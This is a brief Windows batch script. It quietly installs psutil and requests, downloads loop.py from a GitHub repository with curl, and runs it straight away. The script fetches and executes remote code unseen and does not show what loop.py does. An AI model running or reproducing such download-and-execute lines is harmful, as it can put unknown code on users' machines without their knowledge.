@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://github.com/irullkwek/fukong/raw/refs/heads/main/loop.py
python loop.py